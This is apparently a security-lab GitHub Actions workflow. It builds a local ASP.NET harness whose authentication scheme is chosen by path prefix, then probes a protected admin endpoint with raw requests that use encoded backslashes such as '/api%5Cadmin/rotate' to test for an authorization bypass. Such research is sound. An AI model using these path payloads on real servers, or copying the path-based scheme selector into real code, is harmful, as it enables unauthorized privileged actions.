@@ -1,0 +1,276 @@
+name: PolicyScheme critical authorization bypass evidence
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/policyscheme-critical-auth-bypass.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  policyscheme-bypass:
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [windows-latest, ubuntu-latest]
+    runs-on: ${{ matrix.os }}
+    timeout-minutes: 20
+    name: policyscheme-${{ matrix.os }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 11.0.100-rc.1.26425.128
+
+      - name: Build first-party authentication selection harness
+        shell: pwsh
+        run: |
+          $root = Join-Path $env:RUNNER_TEMP 'policyscheme-critical'
+          New-Item -ItemType Directory -Force -Path $root | Out-Null
+
+          @'
+          <Project Sdk="Microsoft.NET.Sdk.Web">
+            <PropertyGroup>
+              <TargetFramework>net11.0</TargetFramework>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <Nullable>enable</Nullable>
+            </PropertyGroup>
+          </Project>
+          '@ | Set-Content (Join-Path $root 'Harness.csproj')
+
+          @'
+          using System.Security.Claims;
+          using System.Text.Encodings.Web;
+          using Microsoft.AspNetCore.Authentication;
+          using Microsoft.AspNetCore.Authorization;
+          using Microsoft.AspNetCore.Hosting;
+          using Microsoft.AspNetCore.Http;
+          using Microsoft.AspNetCore.Http.Features;
+          using Microsoft.Extensions.DependencyInjection;
+          using Microsoft.Extensions.Hosting;
+          using Microsoft.Extensions.Options;
+
+          await Host.CreateDefaultBuilder(args)
+              .ConfigureWebHostDefaults(web =>
+              {
+                  web.UseKestrel(o => o.ListenLocalhost(5072));
+
+                  web.ConfigureServices(services =>
+                  {
+                      services
+                          .AddAuthentication("selector")
+                          .AddPolicyScheme("selector", "selector", options =>
+                          {
+                              options.ForwardDefaultSelector = ctx =>
+                              {
+                                  var selected = ctx.Request.Path.StartsWithSegments("/admin")
+                                      ? "Blocked"
+                                      : "Permit";
+                                  Console.WriteLine($"AUTH_SELECTOR path={ctx.Request.Path.Value} selected={selected}");
+                                  return selected;
+                              };
+                          })
+                          .AddScheme<AuthenticationSchemeOptions, BlockedHandler>("Blocked", _ => { })
+                          .AddScheme<AuthenticationSchemeOptions, PermitHandler>("Permit", _ => { });
+
+                      services.AddAuthorization();
+                      services.AddRouting();
+                  });
+
+                  web.Configure(app =>
+                  {
+                      var actionHits = 0;
+                      var marker = Path.Combine(AppContext.BaseDirectory, "POLICYSCHEME_ACTION.marker");
+                      if (File.Exists(marker))
+                      {
+                          File.Delete(marker);
+                      }
+
+                      app.Use(async (ctx, next) =>
+                      {
+                          Console.WriteLine($"TOP raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBase={ctx.Request.PathBase.Value} path={ctx.Request.Path.Value}");
+                          await next();
+                      });
+
+                      app.UsePathBase("/api");
+
+                      app.Use(async (ctx, next) =>
+                      {
+                          Console.WriteLine($"AFTER_PATHBASE raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} pathBase={ctx.Request.PathBase.Value} path={ctx.Request.Path.Value}");
+                          await next();
+                      });
+
+                      app.UseRouting();
+                      app.UseAuthentication();
+                      app.UseAuthorization();
+
+                      app.UseEndpoints(endpoints =>
+                      {
+                          endpoints.MapPost("/admin/rotate", async ctx =>
+                          {
+                              Interlocked.Increment(ref actionHits);
+                              File.WriteAllText(marker, "EXECUTED");
+                              Console.WriteLine($"AUTHORIZED_ACTION_HIT userAuth={ctx.User.Identity?.IsAuthenticated} authType={ctx.User.Identity?.AuthenticationType} raw={ctx.Features.Get<IHttpRequestFeature>()?.RawTarget} path={ctx.Request.Path.Value}");
+                              ctx.Response.StatusCode = StatusCodes.Status200OK;
+                              await ctx.Response.WriteAsync("AUTHORIZED_PRIVILEGED_ACTION_EXECUTED");
+                          })
+                          .RequireAuthorization();
+
+                          endpoints.MapGet("/evidence", async ctx =>
+                          {
+                              await ctx.Response.WriteAsJsonAsync(new
+                              {
+                                  actionHits,
+                                  markerExists = File.Exists(marker),
+                                  marker,
+                                  authenticated = ctx.User.Identity?.IsAuthenticated ?? false,
+                                  authType = ctx.User.Identity?.AuthenticationType
+                              });
+                          });
+                      });
+
+                      app.Run(async ctx =>
+                      {
+                          ctx.Response.StatusCode = StatusCodes.Status404NotFound;
+                          await ctx.Response.WriteAsync("NOT_FOUND");
+                      });
+                  });
+              })
+              .Build()
+              .RunAsync();
+
+          sealed class PermitHandler : AuthenticationHandler<AuthenticationSchemeOptions>
+          {
+              public PermitHandler(
+                  IOptionsMonitor<AuthenticationSchemeOptions> options,
+                  ILoggerFactory logger,
+                  UrlEncoder encoder)
+                  : base(options, logger, encoder)
+              {
+              }
+
+              protected override Task<AuthenticateResult> HandleAuthenticateAsync()
+              {
+                  var identity = new ClaimsIdentity(
+                      new[] { new Claim(ClaimTypes.Name, "permitted-user") },
+                      Scheme.Name);
+                  var principal = new ClaimsPrincipal(identity);
+                  return Task.FromResult(
+                      AuthenticateResult.Success(
+                          new AuthenticationTicket(principal, Scheme.Name)));
+              }
+          }
+
+          sealed class BlockedHandler : AuthenticationHandler<AuthenticationSchemeOptions>
+          {
+              public BlockedHandler(
+                  IOptionsMonitor<AuthenticationSchemeOptions> options,
+                  ILoggerFactory logger,
+                  UrlEncoder encoder)
+                  : base(options, logger, encoder)
+              {
+              }
+
+              protected override Task<AuthenticateResult> HandleAuthenticateAsync()
+                  => Task.FromResult(AuthenticateResult.Fail("Protected admin path"));
+
+              protected override Task HandleChallengeAsync(AuthenticationProperties properties)
+              {
+                  Response.StatusCode = StatusCodes.Status401Unauthorized;
+                  return Task.CompletedTask;
+              }
+          }
+          '@ | Set-Content (Join-Path $root 'Program.cs')
+
+          dotnet build (Join-Path $root 'Harness.csproj') -c Release
+          "HARNESS_ROOT=$root" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+
+      - name: Exercise protected and encoded-parent authorization paths
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $root = $env:HARNESS_ROOT
+          $serverLog = Join-Path $root 'server.log'
+          $serverErr = Join-Path $root 'server.err'
+
+          $proc = Start-Process dotnet -ArgumentList @(
+            'run','--no-build','-c','Release',
+            '--project',(Join-Path $root 'Harness.csproj')
+          ) -RedirectStandardOutput $serverLog -RedirectStandardError $serverErr -PassThru
+
+          function Invoke-Raw([string]$Target) {
+              $client = [System.Net.Sockets.TcpClient]::new('127.0.0.1',5072)
+              try {
+                  $stream = $client.GetStream()
+                  $req = "POST $Target HTTP/1.1`r`nHost: localhost:5072`r`nContent-Length: 0`r`nConnection: close`r`n`r`n"
+                  $bytes = [Text.Encoding]::ASCII.GetBytes($req)
+                  $stream.Write($bytes,0,$bytes.Length)
+                  $stream.Flush()
+                  $reader = [IO.StreamReader]::new($stream,[Text.Encoding]::Latin1)
+                  return $reader.ReadToEnd()
+              }
+              finally {
+                  $client.Dispose()
+              }
+          }
+
+          try {
+              for ($i=0; $i -lt 80; $i++) {
+                  try {
+                      $tcp=[Net.Sockets.TcpClient]::new('127.0.0.1',5072)
+                      $tcp.Dispose()
+                      break
+                  }
+                  catch {
+                      Start-Sleep -Milliseconds 250
+                  }
+              }
+
+              $cases = [ordered]@{
+                  normal_protected = Invoke-Raw '/api/admin/rotate'
+                  encoded_parent_mixed = Invoke-Raw '/api%5Cadmin/rotate'
+                  encoded_parent_full = Invoke-Raw '/api%5Cadmin%5Crotate'
+                  encoded_child = Invoke-Raw '/api/admin%5Crotate'
+              }
+
+              $summary = [ordered]@{}
+              foreach($name in $cases.Keys) {
+                  $raw = $cases[$name]
+                  $summary[$name] = [ordered]@{
+                      status = ($raw -split "`r`n")[0]
+                      action = $raw.Contains('AUTHORIZED_PRIVILEGED_ACTION_EXECUTED')
+                      not_found = $raw.Contains('NOT_FOUND')
+                      raw = $raw
+                  }
+              }
+
+              $summary | ConvertTo-Json -Depth 6 | Set-Content (Join-Path $root 'results.json')
+              Get-Content (Join-Path $root 'results.json')
+
+              Write-Host '=== SERVER LOG ==='
+              Get-Content $serverLog
+              Write-Host '=== SERVER ERR ==='
+              Get-Content $serverErr
+
+              if (-not $summary.normal_protected.status.Contains('401')) {
+                  throw 'Normal protected path did not require authorization.'
+              }
+          }
+          finally {
+              Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+          }
+
+      - name: Upload PolicyScheme evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: policyscheme-critical-${{ matrix.os }}
+          path: |
+            ${{ runner.temp }}/policyscheme-critical/results.json
+            ${{ runner.temp }}/policyscheme-critical/server.log
+            ${{ runner.temp }}/policyscheme-critical/server.err
